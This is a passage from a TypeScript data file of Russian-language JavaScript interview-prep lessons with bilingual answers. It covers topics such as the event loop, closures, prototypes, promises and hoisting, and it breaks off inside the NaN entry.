import type { Topic, QuizItem } from "@/types/content";

/**
 * Весь учебный контент приложения.
 * Это статические данные — они не меняются в рантайме.
 * Прогресс и заметки пользователя хранятся отдельно (см. src/store).
 */
export const TOPICS: Topic[] = [
  // ---------------------------------------------------------------------
  // Разделы в разработке (структура готова, контент будет добавлен позже)
  // ---------------------------------------------------------------------
  {
    id: "javascript",
    title: "JavaScript",
    subtopics: [
      {
        id: "js-event-loop",
        title: "Event Loop",
        content: {
          title: "Event Loop (цикл событий)",
          shortExplanation:
            "Event Loop — это механизм, который позволяет однопоточному JavaScript выполнять асинхронные операции, не блокируя основной поток.",
          detailedExplanation:
            "JavaScript выполняет код в одном потоке через call stack (стек вызовов). Асинхронные операции (таймеры, сетевые запросы, промисы) не выполняются прямо в стеке — они передаются в Web API/Node API, а их колбэки попадают в очереди задач. Есть две основные очереди: microtask queue (промисы, queueMicrotask) и macrotask queue (setTimeout, setInterval, события). Event Loop на каждой итерации сначала опустошает call stack, затем полностью очищает microtask queue, и только потом берёт одну задачу из macrotask queue — поэтому промисы всегда выполняются раньше setTimeout(fn, 0). В браузере есть ещё третий момент, о котором часто забывают: между обработкой macrotask и следующей итерацией движок может выполнить обновление рендера (rAF-колбэки, layout, paint), если подошло время кадра — то есть рендеринг не отдельная очередь задач, а встроенная пауза внутри самого цикла. Именно поэтому requestAnimationFrame — не microtask и не обычный macrotask, а колбэк, привязанный к этой фазе рендера, и выполняется один раз перед следующей отрисовкой кадра. В Node.js модель чуть отличается: там нет rendering-фазы, зато есть свои дополнительные очереди (process.nextTick, setImmediate), которые выполняются в чуть другом порядке относительно microtask/macrotask, чем в браузере. Практическая опасность бесконечно порождающих себя микрозадач — это не только теоретический риск: такой код полностью блокирует рендеринг и ввод пользователя, потому что браузер не может перейти к следующей macrotask (и, соответственно, к отрисовке кадра), пока microtask queue не опустеет. Поэтому тяжёлые синхронные вычисления внутри .then-цепочек — частая причина 'зависшего' UI, даже если каждый отдельный .then выглядит безобидно.",
          codeExample:
            "console.log('1');\nsetTimeout(() => console.log('2'), 0);\nPromise.resolve().then(() => console.log('3'));\nconsole.log('4');\n\n// Порядок вывода: 1, 4, 3, 2\n// Синхронный код -> microtasks (промисы) -> macrotasks (setTimeout)",
          interviewQuestion: "Почему Promise.resolve().then(...) выполнится раньше, чем setTimeout(fn, 0)?",
          interviewAnswerRu:
            "Потому что callback промиса попадает в microtask queue, а callback setTimeout — в macrotask queue. Event Loop после каждой синхронной операции (или macrotask) сначала полностью опустошает microtask queue и только потом переходит к следующей macrotask. Поэтому даже с нулевой задержкой setTimeout выполнится после всех уже запланированных промисов.",
          interviewAnswerEn:
            "Because a promise's callback goes into the microtask queue, while setTimeout's callback goes into the macrotask queue. After each synchronous run (or macrotask), the event loop always drains the entire microtask queue before moving on to the next macrotask. So even with a zero delay, setTimeout runs after all promises that were already scheduled.",
          pitfalls: [
            "Думать, что setTimeout(fn, 0) выполнится 'сразу же' — на деле он всегда после текущего синхронного кода и всех микрозадач.",
            "Не учитывать, что бесконечно добавляющиеся микрозадачи (например, рекурсивный .then) могут заблокировать macrotask queue и рендеринг браузера.",
          ],
          practiceTask:
            "Напишите код с несколькими console.log, setTimeout и Promise.then вперемешку и предскажите порядок вывода до запуска, затем проверьте себя.",
          resources: {
            docs: [
              { title: "JavaScript Execution Model — MDN", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Execution_model" },
            ],
            articles: [
              { title: "Tasks, microtasks, queues and schedules (Jake Archibald)", url: "https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/" },
              { title: "Event Loop: Microtasks and Macrotasks (javascript.info)", url: "https://javascript.info/event-loop" },
            ],
          },
        },
      },
      {
        id: "js-closures",
        title: "Closures",
        content: {
          title: "Closures (замыкания)",
          shortExplanation:
            "Замыкание — это функция, которая 'помнит' переменные из области видимости, в которой была создана, даже после того как эта область формально завершила выполнение.",
          detailedExplanation:
            "Каждая функция в JavaScript создаёт замыкание над лексическим окружением, в котором она объявлена. Это позволяет писать паттерны вроде фабрик функций, приватных переменных (через модульный паттерн) и каррирования. Замыкания — основа многих React-концепций: хуки, обработчики событий, кастомные хуки — всё это активно использует замыкания, поэтому баги вроде stale closure напрямую связаны с этой темой. Важно понимать, что замыкание захватывает не значение переменной 'на момент создания', а саму переменную (ссылку на её ячейку в памяти) — поэтому если внешняя функция продолжает менять эту переменную после того, как замыкание уже создано, следующий вызов замыкания увидит актуальное, а не первоначальное значение. Это же свойство лежит в основе мемоизации вручную (замыкание над Map-кешем внутри фабрики функций) и дебаунсинга/троттлинга, где замыкание хранит id таймера или временную метку последнего вызова между вызовами обёрнутой функции. С точки зрения памяти каждое замыкание держит ссылку на всё лексическое окружение, в котором было создано, а не только на используемые переменные — в старых движках это могло приводить к удержанию в памяти куда большего объёма данных, чем кажется на первый взгляд, хотя современные JS-движки умеют частично оптимизировать это через анализ фактически используемых переменных. Поэтому долгоживущие замыкания (например, в глобальных обработчиках событий, которые никогда не снимаются) — частый источник утечек памяти в долго работающих SPA.",
          codeExample:
            "function createCounter() {\n  let count = 0; // приватная переменная, доступна только через замыкание\n  return {\n    increment: () => ++count,\n    get: () => count,\n  };\n}\n\nconst counter = createCounter();\ncounter.increment();\ncounter.increment();\nconsole.log(counter.get()); // 2",
          interviewQuestion: "Как замыкания помогают реализовать приватные переменные в JavaScript?",
          interviewAnswerRu:
            "В JavaScript нет встроенных приватных полей для обычных функций (в отличие от классов с #field), но замыкание решает эту задачу: если переменная объявлена внутри внешней функции и не возвращается напрямую, доступ к ней возможен только через функции, которые эта внешняя функция вернула (например, increment/get). Снаружи нет способа обратиться к count напрямую — только через предоставленный API.",
          interviewAnswerEn:
            "JavaScript has no built-in private fields for plain functions (unlike classes with #field), but closures solve this: if a variable is declared inside an outer function and never returned directly, it can only be accessed through the functions that outer function returned (like increment/get). There's no way to reach count directly from the outside — only through the exposed API.",
          pitfalls: [
            "Создавать замыкание внутри цикла с var и получать одно и то же значение переменной во всех колбэках (классическая ловушка var vs let).",
            "Не понимать связь между замыканиями и утечками памяти — замкнутые переменные не собираются сборщиком мусора, пока жив колбэк, который их использует.",
          ],
          practiceTask:
            "Воспроизведите классический баг: цикл for (var i = 0; ...) с setTimeout внутри, который выводит одно и то же значение i для всех итераций, затем исправьте через let или через IIFE.",
          resources: {
            docs: [
              { title: "Closures — MDN", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Closures" },
            ],
            articles: [
              { title: "You Don't Know JS Yet: Using Closures (Kyle Simpson)", url: "https://github.com/getify/You-Dont-Know-JS/blob/2nd-ed/scope-closures/ch7.md" },
            ],
          },
        },
      },
      {
        id: "js-prototypes",
        title: "Prototypes",
        content: {
          title: "Prototypes (прототипы)",
          shortExplanation:
            "Прототип — это объект, на который ссылается другой объект и у которого 'заимствует' свойства и методы, если не находит их у себя напрямую.",
          detailedExplanation:
            "В JavaScript у каждого объекта есть внутренняя ссылка [[Prototype]] (доступная через Object.getPrototypeOf или устаревшее __proto__) на другой объект. Когда вы обращаетесь к свойству, движок сначала ищет его на самом объекте, а если не находит — поднимается по цепочке прототипов (prototype chain), пока не найдёт свойство или не дойдёт до null. Классы в JS (class Foo {}) — это синтаксический сахар поверх той же прототипной модели: методы класса на самом деле лежат на Foo.prototype. Поиск по цепочке прототипов не бесконечен: он останавливается либо когда свойство найдено, либо когда движок доходит до Object.prototype и затем до null — конца цепочки, где [[Prototype]] уже отсутствует. Это отличается от простого перечисления свойств: for...in проходит и по собственным, и по унаследованным перечисляемым свойствам, тогда как Object.hasOwnProperty(key) или более новый Object.hasOwn(obj, key) проверяют наличие свойства именно на самом объекте, игнорируя прототип — этим различием часто пользуются, чтобы отфильтровать 'мусор' из унаследованных методов при переборе объекта. Object.create(proto) позволяет явно создать объект с заданным прототипом без вызова конструктора — это более низкоуровневый инструмент, чем new, и его часто используют для настройки наследования вручную (как в примере ниже) или для создания объектов вообще без прототипа (Object.create(null)), когда важно исключить даже унаследованные методы вроде toString. На практике очень длинные цепочки прототипов (глубокое многоуровневое наследование) не только усложняют чтение кода, но и делают поиск несуществующего свойства чуть медленнее, поскольку движку приходится подняться до самого конца цепочки, прежде чем вернуть undefined.",
          codeExample:
            "function Animal(name) {\n  this.name = name;\n}\nAnimal.prototype.speak = function () {\n  return `${this.name} makes a sound`;\n};\n\nconst dog = new Animal('Rex');\ndog.speak(); // 'Rex makes a sound' — метод найден через прототип\nObject.getPrototypeOf(dog) === Animal.prototype; // true",
          interviewQuestion: "Чем прототипное наследование отличается от классического (например, в Java)?",
          interviewAnswerRu:
            "В классическом наследовании классы — это статические шаблоны, и объект получает копию поведения класса при создании. В JavaScript наследование основано на живых ссылках: объект не копирует методы прототипа, а обращается к ним по цепочке в момент вызова. Это значит, что изменение Animal.prototype.speak после создания dog всё равно повлияет на dog.speak(), потому что dog обращается к актуальному прототипу, а не к его снимку на момент создания.",
          interviewAnswerEn:
            "In classical inheritance, classes are static blueprints, and an object receives a copy of the class's behavior at creation time. JavaScript's inheritance is based on live references: an object doesn't copy the prototype's methods, it looks them up along the chain at call time. That means changing Animal.prototype.speak after dog was created still affects dog.speak(), because dog looks up the current prototype, not a snapshot taken at creation.",
          pitfalls: [
            "Путать class-синтаксис с 'настоящими' классами других языков — под капотом это всё равно прототипы.",
            "Модифицировать встроенные прототипы (Array.prototype, Object.prototype) — считается плохой практикой и может сломать сторонний код.",
          ],
          practiceTask:
            "Реализуйте наследование без class-синтаксиса: создайте Dog.prototype = Object.create(Animal.prototype) и переопределите speak в Dog.prototype, вызывая родительский метод через Animal.prototype.speak.call(this).",
          resources: {
            docs: [
              { title: "Inheritance and the Prototype Chain — MDN", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain" },
            ],
            articles: [
              { title: "Prototypal Inheritance (javascript.info)", url: "https://javascript.info/prototype-inheritance" },
            ],
          },
        },
      },
      {
        id: "js-this",
        title: "this",
        content: {
          title: "this",
          shortExplanation:
            "this — это специальное значение внутри функции, которое указывает на объект, в контексте которого функция была вызвана, а не на то, где она была объявлена.",
          detailedExplanation:
            "Значение this определяется способом вызова функции, а не местом её объявления (кроме стрелочных функций). Основные правила: при вызове как метода объекта (obj.method()) this — это obj; при обычном вызове функции (fn()) this — undefined в strict mode или глобальный объект иначе; при вызове через call/apply/bind this задаётся явно; стрелочные функции не имеют своего this — они берут его из внешнего (лексического) окружения, в котором были объявлены. Именно поэтому стрелочные функции так удобны для колбэков внутри методов классов и React-компонентов. В строгом режиме (strict mode, который включён по умолчанию во всех ES-модулях и внутри классов) вызов функции без явного объекта-владельца даёт this === undefined, а не глобальный объект — это специально сделано, чтобы опечатки вроде забытого this.value внутри метода сразу приводили к ошибке (TypeError), а не к тихой порче глобального состояния. Обработчики DOM-событий — отдельный частный случай: если колбэк передан напрямую через addEventListener, движок вызывает его с this, равным DOM-элементу, на котором сработало событие, независимо от того, как этот колбэк был объявлен как обычная function — и это иногда путают с обычными правилами вызова. class-поля, объявленные как стрелочные функции (handleClick = () => {...}), стали настолько частым паттерном в React именно потому, что они создают привязанный this один раз, при создании экземпляра, и не требуют отдельного bind в конструкторе. Стоит помнить и обратную сторону: стрелочные методы нельзя переопределить через prototype и они делают экземпляр чуть тяжелее по памяти, поскольку каждая функция создаётся заново для каждого объекта, а не переиспользуется через прототип, как обычный метод класса.",
          codeExample:
            "const obj = {\n  name: 'obj',\n  regular() { return this.name; },\n  arrow: () => this?.name, // берёт this из внешнего окружения, не из obj\n};\n\nconst { regular } = obj;\nregular(); // undefined или ошибка — потерян контекст вызова\nobj.regular(); // 'obj' — вызван как метод obj",
          interviewQuestion: "Почему this 'теряется', когда метод объекта передают как колбэк (например, в setTimeout)?",
          interviewAnswerRu:
            "Потому что this определяется на момент вызова функции, а не на момент её объявления или извлечения из объекта. Когда вы пишете setTimeout(obj.regular, 1000), вы передаёте только саму функцию, оторванную от obj, и вызывается она уже как обычная функция, без привязки к объекту — поэтому this внутри неё не будет obj. Исправить можно через .bind(obj), обёртку в стрелочную функцию (() => obj.regular()), или объявив метод как стрелочную функцию-свойство класса.",
          interviewAnswerEn:
            "Because this is determined at call time, not at the point where the function was declared or pulled off an object. When you write setTimeout(obj.regular, 1000), you're passing just the bare function, detached from obj, and it later gets called as a plain function with no binding to the object — so this inside it won't be obj. Fixes: .bind(obj), wrapping it in an arrow function (() => obj.regular()), or declaring the method as an arrow-function class property.",
          pitfalls: [
            "Передавать метод объекта как колбэк напрямую (onClick={obj.method}) без bind или обёртки в React-коде на классах.",
            "Использовать обычную function для колбэка там, где нужен this из внешнего окружения — тогда лучше подходит стрелочная функция.",
          ],
          practiceTask:
            "Создайте объект с методом, который использует this, передайте этот метод в setTimeout напрямую и понаблюдайте за ошибкой, затем исправьте тремя разными способами (bind, стрелочная обёртка, arrow-свойство).",
          resources: {
            docs: [
              { title: "this — MDN", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/this" },
            ],
            articles: [
              { title: "Understanding JavaScript Function Invocation and \"this\" (Yehuda Katz)", url: "https://yehudakatz.com/2011/08/11/understanding-javascript-function-invocation-and-this/" },
            ],
          },
        },
      },
      {
        id: "js-promises-async",
        title: "Promises & async/await",
        content: {
          title: "Promises & async/await",
          shortExplanation:
            "Promise — объект, представляющий результат асинхронной операции в будущем; async/await — синтаксический сахар, который позволяет писать асинхронный код в стиле, похожем на синхронный.",
          detailedExplanation:
            "Promise может находиться в одном из трёх состояний: pending (в ожидании), fulfilled (выполнен успешно) или rejected (завершён с ошибкой), и это состояние можно изменить только один раз. async-функция всегда возвращает Promise, а await 'приостанавливает' выполнение функции до того, как промис выполнится, разворачивая его результат — при этом сама async-функция не блокирует остальной код, потому что она асинхронна целиком. Обработка ошибок в async/await идёт через обычный try/catch, что часто удобнее, чем цепочка .then/.catch. Executor-функция, переданная в new Promise((resolve, reject) => {...}), запускается синхронно и немедленно, в момент создания промиса, а не отложенно — асинхронной становится не сама функция-исполнитель, а момент вызова .then/await для получения результата. Для параллельных операций существует целое семейство статических методов: Promise.all падает целиком при первой же ошибке любого из промисов, Promise.allSettled всегда дожидается всех промисов и возвращает статус каждого (fulfilled/rejected) без падения, Promise.race разрешается по первому завершившемуся промису (успешно или с ошибкой), а Promise.any — по первому успешно выполненному, игнорируя ошибки остальных, пока хотя бы один не завершится успешно. Выбор между ними — это выбор семантики 'что считать общим результатом', а не просто синтаксиса: например, для параллельной загрузки нескольких независимых виджетов страницы обычно нужен allSettled, чтобы падение одного не обрушило показ остальных. Стоит также помнить, что await внутри цикла for одну за другой дожидается каждой итерации — если операции внутри цикла независимы, такой код искусственно сериализует то, что могло бы выполняться параллельно, и именно это чаще всего чинят переходом на Promise.all(items.map(...)).",
          codeExample:
            "async function loadUser(id) {\n  try {\n    const response = await fetch(`/api/users/${id}`);\n    if (!response.ok) throw new Error('Network error');\n    const user = await response.json();\n    return user;\n  } catch (error) {\n    console.error('Failed to load user:', error);\n    throw error;\n  }\n}",
          interviewQuestion: "Что произойдёт, если внутри async-функции забыть await перед промисом?",
          interviewAnswerRu:
            "Функция не будет ждать завершения этого промиса — код продолжит выполняться дальше немедленно, а сам промис останется 'висеть' в фоне. Если это была операция с побочным эффектом (например, запись в БД), она всё равно выполнится, но код, идущий после, может завершиться раньше, чем эта операция закончится, и любая ошибка внутри непойманного промиса приведёт к unhandled promise rejection, а не будет поймана внешним try/catch.",
          interviewAnswerEn:
            "The function won't wait for that promise to settle — execution continues immediately, and the promise is left running in the background unattended. If it was a side-effecting operation (like a database write), it still runs, but code after it may finish before that operation completes, and any error inside the un-awaited promise becomes an unhandled promise rejection instead of being caught by the surrounding try/catch.",
          pitfalls: [
            "Забывать await перед промисом внутри async-функции — асинхронная операция 'улетает' в фон незамеченной.",
            "Использовать await последовательно там, где операции независимы и могли бы выполняться параллельно через Promise.all.",
          ],
          practiceTask:
            "Перепишите цепочку .then().catch() на async/await с try/catch для функции, которая делает fetch и парсит JSON, сохранив ту же обработку ошибок.",
          resources: {
            docs: [
              { title: "Using Promises — MDN", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Using_promises" },
            ],
            articles: [
              { title: "Async/await (javascript.info)", url: "https://javascript.info/async-await" },
              { title: "Tasks, microtasks, queues and schedules (Jake Archibald)", url: "https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/" },
            ],
          },
        },
      },
      {
        id: "js-call-stack",
        title: "Call Stack",
        content: {
          title: "Call Stack (стек вызовов)",
          shortExplanation:
            "Call stack — структура данных LIFO (последним пришёл — первым вышел), в которой движок JS отслеживает, какая функция сейчас выполняется и куда вернуться после её завершения.",
          detailedExplanation:
            "Когда функция вызывается, для неё создаётся новый frame (кадр) и кладётся на вершину стека; когда функция завершается (return или конец тела), её frame снимается со стека, и выполнение возвращается к вызвавшей функции. Поскольку JS однопоточный, стек всего один — глубокая рекурсия без базового случая приводит к переполнению стека (Maximum call stack size exceeded). Именно call stack показывает связь между синхронным кодом и Event Loop: пока стек не пуст, движок не берёт следующую задачу из очереди микро/макрозадач.",
          codeExample:
            "function third() { console.log(new Error().stack); }\nfunction second() { third(); }\nfunction first() { second(); }\nfirst();\n// Стек на момент вызова console.log: third -> second -> first -> (global)",
          interviewQuestion: "Почему глубокая рекурсия может привести к ошибке 'Maximum call stack size exceeded'?",
          interviewAnswerRu:
            "Потому что каждый рекурсивный вызов добавляет новый frame на call stack, а стек имеет ограниченный размер (задаётся движком). Если рекурсия не имеет корректного базового случая или слишком глубока, стек переполняется раньше, чем функция успевает вернуть результат.",
          interviewAnswerEn:
            "Because every recursive call pushes a new frame onto the call stack, and the stack has a limited size set by the engine. If the recursion lacks a proper base case or is simply too deep, the stack overflows before the function can return a result.",
          pitfalls: [
            "Писать рекурсию без базового случая — гарантированный overflow.",
            "Путать call stack (синхронный, один) с очередями задач (микро/макрозадачи) — это разные механизмы.",
          ],
        },
      },
      {
        id: "js-microtasks-vs-macrotasks",
        title: "Microtasks vs Macrotasks",
        content: {
          title: "Microtasks vs Macrotasks",
          shortExplanation:
            "Microtasks (промисы, queueMicrotask) выполняются полностью, до последней, сразу после текущего синхронного кода и раньше любой macrotask; macrotasks (setTimeout, setInterval, события) выполняются по одной за итерацию цикла.",
          detailedExplanation:
            "После каждой синхронной операции (в том числе после каждой отдельной macrotask) движок сначала опустошает всю очередь микрозадач — включая те, что были добавлены другими микрозадачами во время этого опустошения — и только потом берёт ровно одну задачу из очереди макрозадач. Это гарантирует, что промисы всегда 'успевают' раньше таймеров, даже с задержкой 0. Практическое следствие: рекурсивно создающие себя микрозадачи (например, .then, который сам ставит новый .then) могут бесконечно откладывать любую macrotask и рендеринг, зависая в браузере.",
          codeExample:
            "setTimeout(() => console.log('macro'), 0);\nPromise.resolve()\n  .then(() => console.log('micro 1'))\n  .then(() => console.log('micro 2'));\n// Вывод: micro 1, micro 2, macro",
          interviewQuestion: "Что произойдёт, если внутри .then рекурсивно ставить ещё один .then?",
          interviewAnswerRu:
            "Очередь микрозадач никогда не опустеет полностью, поэтому Event Loop не сможет перейти к следующей macrotask (включая setTimeout и рендеринг браузера) — интерфейс 'зависнет', хотя формально JS не заблокирован в привычном смысле бесконечного цикла.",
          interviewAnswerEn:
            "The microtask queue never fully drains, so the event loop can never move on to the next macrotask (including setTimeout callbacks and browser rendering) — the UI effectively freezes, even though there's no classic infinite synchronous loop blocking the thread.",
          pitfalls: [
            "Считать, что 'микрозадача — это просто мелкая задача' — на деле это строгая категория (промисы, queueMicrotask), а не оценка размера работы.",
            "Не замечать, что цепочка из сотен .then может отложить рендеринг на заметное время.",
          ],
        },
      },
      {
        id: "js-scope",
        title: "Scope",
        content: {
          title: "Scope (область видимости)",
          shortExplanation:
            "Scope определяет, где в коде доступна конкретная переменная. В JS есть глобальная область, функциональная (function scope) и блочная (block scope, для let/const).",
          detailedExplanation:
            "var имеет только function scope — переменная видна во всей функции независимо от вложенных блоков (if, for), а let/const имеют block scope — видны только внутри блока {}, в котором объявлены. Области видимости образуют цепочку (scope chain): при поиске переменной движок сначала смотрит в текущей области, затем поднимается к внешней, и так до глобальной — именно на этом механизме строятся замыкания. Лексический scope (в отличие от динамического) определяется местом объявления функции в коде, а не тем, откуда её вызвали.",
          codeExample:
            "function example() {\n  if (true) {\n    var fromVar = 'a';   // function scope — видна и снаружи if\n    let fromLet = 'b';   // block scope — видна только внутри if\n  }\n  console.log(fromVar); // 'a'\n  console.log(typeof fromLet); // 'undefined' — вне блока её нет\n}",
          interviewQuestion: "Чем function scope отличается от block scope на практике?",
          interviewAnswerRu:
            "var 'протекает' за пределы блоков if/for/while — видна во всей функции, что часто приводит к неожиданному переиспользованию переменной. let/const строго ограничены блоком {} — это делает код предсказуемее и ближе к тому, как область видимости работает в большинстве других языков.",
          interviewAnswerEn:
            "var leaks out of if/for/while blocks — it's visible throughout the whole function, which often leads to unexpected variable reuse. let/const are strictly scoped to the enclosing {} block — this makes the code more predictable and closer to how scoping works in most other languages.",
          pitfalls: [
            "Объявлять счётчик цикла через var и удивляться, что он виден и после цикла.",
            "Путать scope (где переменная видна статически) с временем жизни значения в памяти (это разные, хоть и связанные, понятия).",
          ],
        },
      },
      {
        id: "js-hoisting",
        title: "Hoisting",
        content: {
          title: "Hoisting (всплытие)",
          shortExplanation:
            "Hoisting — поведение JS, при котором объявления переменных и функций как будто 'поднимаются' в начало своей области видимости ещё до выполнения кода.",
          detailedExplanation:
            "var поднимается и сразу инициализируется значением undefined, поэтому обращение к ней до строки объявления не вызывает ошибку, а просто даёт undefined. let/const тоже технически поднимаются, но остаются в 'temporal dead zone' (TDZ) — обращение к ним до объявления бросает ReferenceError, а не возвращает undefined. Объявления function (function declaration) поднимаются целиком, вместе с телом, поэтому такую функцию можно вызвать до её текстового объявления в коде — в отличие от function expression (const fn = function() {}), которая ведёт себя как обычная переменная.",
          codeExample:
            "console.log(a); // undefined (var поднялась, но не проинициализирована значением)\nvar a = 1;\n\nconsole.log(b); // ReferenceError: Cannot access 'b' before initialization (TDZ)\nlet b = 2;\n\ngreet(); // работает — function declaration поднимается целиком\nfunction greet() { console.log('hi'); }",
          interviewQuestion: "Почему обращение к let-переменной до её объявления кидает ошибку, а к var — нет?",
          interviewAnswerRu:
            "var поднимается и сразу инициализируется значением undefined, поэтому раннее обращение просто возвращает undefined. let и const тоже поднимаются, но не инициализируются — от начала блока до строки объявления они находятся в temporal dead zone, и любое обращение в этот момент — ошибка. Это осознанное поведение спецификации, призванное отловить использование переменной до её логического объявления.",
          interviewAnswerEn:
            "var is hoisted and immediately initialized to undefined, so an early reference just returns undefined. let and const are hoisted too, but not initialized — from the start of the block to the declaration line they sit in the temporal dead zone, and any access there throws. This is deliberate spec behavior meant to catch using a variable before its logical declaration.",
          pitfalls: [
            "Полагаться на hoisting var как на 'фичу' — это почти всегда источник багов, а не полезное поведение.",
            "Забывать, что function expression (в отличие от declaration) не поднимается вместе с телом.",
          ],
        },
      },
      {
        id: "js-classes",
        title: "Classes",
        content: {
          title: "Classes (классы)",
          shortExplanation:
            "class в JavaScript — синтаксический сахар поверх прототипного наследования: методы класса на самом деле определяются на Class.prototype, а не копируются в каждый экземпляр.",
          detailedExplanation:
            "В отличие от обычных функций, тело класса всегда выполняется в strict mode, а вызов класса без new бросает ошибку (в то время как обычную функцию-конструктор можно случайно вызвать без new). Приватные поля (#field) — это настоящая инкапсуляция на уровне синтаксиса, в отличие от соглашения об именовании через подчёркивание (_field), к которому снаружи по-прежнему есть доступ. extends и super реализуют наследование через ту же прототипную цепочку: Child.prototype.__proto__ === Parent.prototype, а super() в конструкторе — это явный вызов родительского конструктора, обязательный до обращения к this в дочернем классе.",
          codeExample:
            "class Animal {\n  #name; // приватное поле — недоступно снаружи\n  constructor(name) { this.#name = name; }\n  speak() { return `${this.#name} makes a sound`; }\n}\n\nclass Dog extends Animal {\n  speak() { return `${super.speak()} (a bark, actually)`; }\n}\n\nnew Dog('Rex').speak();",
          interviewQuestion: "Чем приватное поле класса (#field) принципиально отличается от соглашения _field?",
          interviewAnswerRu:
            "_field — это просто договорённость между разработчиками, само поле остаётся обычным публичным свойством объекта и доступно снаружи как obj._field. #field — это настоящая инкапсуляция на уровне синтаксиса и движка: обращение к #field снаружи класса — синтаксическая ошибка, а не просто 'плохая практика', которую можно нарушить.",
          interviewAnswerEn:
            "_field is just a convention between developers — the field is still a regular public property, accessible from outside as obj._field. #field is real encapsulation enforced by the language and engine: accessing #field from outside the class is a syntax error, not just a 'bad practice' someone could bypass.",
          pitfalls: [
            "Забывать вызвать super() в конструкторе дочернего класса до обращения к this.",
            "Считать классы 'другим' механизмом наследования, чем прототипы — под капотом это одно и то же.",
          ],
        },
      },
      {
        id: "js-shallow-vs-deep-copy",
        title: "Shallow Copy vs Deep Copy",
        content: {
          title: "Shallow Copy vs Deep Copy",
          shortExplanation:
            "Shallow copy копирует только верхний уровень объекта/массива — вложенные объекты остаются общими ссылками с оригиналом; deep copy рекурсивно копирует все уровни, полностью отвязывая копию от оригинала.",
          detailedExplanation:
            "Object.assign({}, obj), spread ({...obj}) и Array.prototype.slice/map делают именно shallow copy: если у obj есть вложенное поле-объект, оно не копируется, а копируется ссылка на тот же самый объект в памяти — изменение вложенного поля в копии повлияет и на оригинал. structuredClone(obj) — встроенный в современные браузеры и Node способ сделать настоящую deep copy без сторонних библиотек, хотя он не умеет клонировать функции и некоторые специфичные объекты (например, DOM-узлы). До появления structuredClone для этого часто (и неправильно) использовали JSON.parse(JSON.stringify(obj)), который дополнительно теряет undefined, функции, Date (превращает в строку), Map/Set и circular references.",
          codeExample:
            "const original = { user: { name: 'Alex' } };\nconst shallow = { ...original };\nshallow.user.name = 'Bob';\nconsole.log(original.user.name); // 'Bob' — вложенный объект общий!\n\nconst deep = structuredClone(original);\ndeep.user.name = 'Carl';\nconsole.log(original.user.name); // всё ещё 'Bob' — deep copy отвязана",
          interviewQuestion: "Почему JSON.parse(JSON.stringify(obj)) — плохой способ сделать глубокую копию?",
          interviewAnswerRu:
            "Потому что этот приём проходит через сериализацию в JSON и обратно, а JSON не умеет представлять функции, undefined, Symbol, Map/Set — они либо теряются, либо превращаются во что-то другое (например, Date станет строкой). Кроме того, он падает с ошибкой на объектах с циклическими ссылками. structuredClone или библиотека вроде lodash.cloneDeep справляются с этим корректно.",
          interviewAnswerEn:
            "Because it round-trips through JSON serialization, and JSON can't represent functions, undefined, Symbol, Map/Set — they're either dropped or silently transformed (a Date becomes a string, for instance). It also throws on objects with circular references. structuredClone or a library like lodash.cloneDeep handles this correctly.",
          pitfalls: [
            "Мутировать вложенный объект после 'копирования' через spread и не понимать, почему оригинал тоже изменился.",
            "Использовать JSON.parse/stringify для клонирования объектов с датами, функциями или Map/Set.",
          ],
        },
      },
      {
        id: "js-null-vs-undefined",
        title: "null vs undefined",
        content: {
          title: "null vs undefined",
          shortExplanation:
            "undefined — значение, которое переменная имеет автоматически, если ей ничего не присвоили; null — значение, которое разработчик присваивает явно, чтобы сказать 'здесь намеренно ничего нет'.",
          detailedExplanation:
            "undefined появляется сам: у необъявленного значения аргумента, у отсутствующего свойства объекта, у функции без return. null же — это осознанное намерение показать 'пустое' значение, и его никогда не выставляет сам движок автоматически (за редкими историческими исключениями вроде document.getElementById для несуществующего элемента). typeof null исторически возвращает 'object' — это известный баг спецификации ECMAScript, оставленный ради обратной совместимости, а typeof undefined корректно возвращает 'undefined'. При нестрогом сравнении null == undefined истинно, но null === undefined — ложно, потому что это разные типы.",
          codeExample:
            "function getUser(id) {\n  const user = database.find(id);\n  return user ?? null; // null — 'пользователь явно не найден', а не undefined\n}\n\ntypeof null; // 'object' (историческая особенность)\nnull == undefined; // true\nnull === undefined; // false",
          interviewQuestion: "Почему в API-функциях принято возвращать null, а не undefined, для 'ничего не найдено'?",
          interviewAnswerRu:
            "Потому что null явно сигнализирует намерение: 'здесь осознанно нет значения', в то время как undefined чаще означает 'значение забыли присвоить' или 'ошибку в логике'. Такое разделение помогает отличить ожидаемое отсутствие данных от бага — например, TypeScript позволяет типизировать возврат как User | null именно с этим смыслом.",
          interviewAnswerEn:
            "Because null explicitly signals intent: 'there's deliberately no value here', whereas undefined more often means 'a value was forgotten' or points to a logic bug. This separation helps distinguish an expected absence of data from an actual bug — TypeScript, for instance, typically types such a return as User | null with exactly this meaning.",
          pitfalls: [
            "Смешивать null и undefined как взаимозаменяемые в одной кодовой базе без чёткого соглашения.",
            "Полагаться на нестрогое == null для проверки 'нет значения' без понимания, что оно ловит оба случая сразу (что иногда и есть цель, а иногда — баг).",
          ],
        },
      },
      {
        id: "js-nan",
        title: "NaN",
        content: {
          title: "NaN (Not a Number)",
          shortExplanation:
            "NaN — специальное числовое значение, которое означает 'результат математической операции не является корректным числом', и оно уникально тем, что не равно даже самому себе.",
          detailedExplanation:
            "NaN появляется при некорректных числовых операциях: Number('abc'), 0/0, undefined + 1. Самое неочевидное свойство NaN — NaN === NaN даёт false, потому что по спецификации IEEE 754 NaN не равен ничему, включая себя самого. Из-за этого проверять значение на NaN нужно через Number.isNaN(value) (строгая проверка типа и значения) или через сравнение value !== value (единственный случай в JS, когда значение не равно самому себе), а не через value === NaN, которое всегда ложно, независимо от value. Устаревшая глобальная функция isNaN(value) сначала приводит аргумент к числу, из-за чего isNaN('abc') тоже вернёт true, хотя строка 'abc' — не число, а не NaN — это частый источник багов.",
          codeExample:
            "NaN === NaN; // false\nNumber.isNaN(NaN); // true — правильный способ проверки\nisNaN('abc'); // true — вводит в заблуждение, строка приводится к NaN перед проверкой\nNumber.isNaN('abc'); // false — правильно: это строка, а не NaN",
